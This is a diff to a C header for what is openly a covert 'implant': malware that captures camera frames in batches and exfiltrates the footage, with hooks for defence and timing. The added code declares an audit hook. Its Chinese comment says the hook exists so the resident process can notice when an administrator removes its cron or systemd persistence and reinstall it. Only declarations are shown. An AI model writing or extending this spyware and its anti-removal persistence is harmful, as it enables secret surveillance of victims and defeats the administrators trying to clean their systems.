@@ -80,6 +80,17 @@ typedef int (*implant_defend_t)(void *ud);
  * 死循环保护把「等批间隔」误判成死循环（详见 src/implant.c）。 */
 typedef void (*implant_sleep_us_t)(uint64_t us, void *ud);
 
+/*
+ * 批结束钩子：每完成一批调用一次，batch_no 为该批序号（从 1 开始）。
+ *
+ * 存在理由：驻留此前只在启动前 ensure 一次。管理员删掉 cron/systemd 单元
+ * 后，只要常驻进程不重启就永不自愈——进程还在跑、画面还在回传，但机器
+ * 重启后植入体就消失了。这个钩子让常驻进程能周期性发现并重装。
+ *
+ * 返回值仅作统计，不终止状态机：自检失败不该杀掉整个守护。
+ */
+typedef int (*implant_audit_t)(uint32_t batch_no, void *ud);
+
 typedef struct {
     cam_config_t cam;             /* 采集配置（宽高/fps/采集窗口/帧数） */
     uint32_t     interval_ms;     /* 两批之间的基准间隔 */
@@ -112,6 +123,7 @@ void implant_set_pack(implant_t *im, implant_pack_t fn, void *ud);
 void implant_set_exfil(implant_t *im, implant_exfil_t fn, void *ud);
 void implant_set_defend(implant_t *im, implant_defend_t fn, void *ud);
 void implant_set_sleep(implant_t *im, implant_sleep_us_t fn, void *ud);
+void implant_set_audit(implant_t *im, implant_audit_t fn, void *ud);
 
 /* 推进一步状态机。返回 IMPLANT_OK / IMPLANT_STOPPED / 具体错误码 */
 implant_err_t implant_step(implant_t *im);
